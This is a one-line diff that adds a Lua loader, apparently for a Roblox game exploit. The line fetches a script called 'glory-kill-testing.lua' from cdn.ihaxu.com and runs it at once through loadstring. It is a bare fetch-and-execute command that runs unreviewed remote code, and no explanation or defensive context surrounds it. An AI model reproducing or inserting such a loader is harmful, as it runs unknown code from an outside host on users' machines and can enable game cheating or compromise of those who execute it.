@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.ihaxu.com/uploads/glory-kill-testing.lua", true))()
